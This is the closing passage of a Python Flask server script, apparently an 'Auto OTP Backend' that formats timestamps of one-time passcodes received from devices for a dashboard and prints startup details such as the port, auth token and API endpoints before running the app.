        otp_list = []
        for otp in otps:
            otp_dict = dict(otp)
            try:
                otp_dict["time_display"] = datetime.fromtimestamp(
                    otp_dict["timestamp"] / 1000, tz=timezone.utc
                ).astimezone().strftime("%Y-%m-%d %H:%M:%S")
            except (OSError, OverflowError, ValueError):
                otp_dict["time_display"] = otp_dict["received_at"]
            otp_list.append(otp_dict)
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return render_template_string(DEVICE_OTPS_TEMPLATE, device=device, otps=otp_list, current_time=current_time)


init_db()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    host = os.environ.get("HOST", "0.0.0.0")
    debug = os.environ.get("FLASK_DEBUG", "0") == "1"
    
    print(f"\n🚀 Auto OTP Backend Server Starting...")
    print(f"📡 Server running on: http://{host}:{port}")
    print(f"🔐 Auth Token: {EXPECTED_TOKEN}")
    print(f"💾 Database: {DB_PATH}")
    print(f"🌐 Dashboard: http://localhost:{port}/")
    print(f"📊 API Stats: http://localhost:{port}/api/stats")
    print(f"📱 API Endpoint: POST http://localhost:{port}/api/otps")
    print(f"\n✨ Dashboard will auto-refresh every 10 seconds\n")
    
    app.run(host=host, port=port, debug=debug)
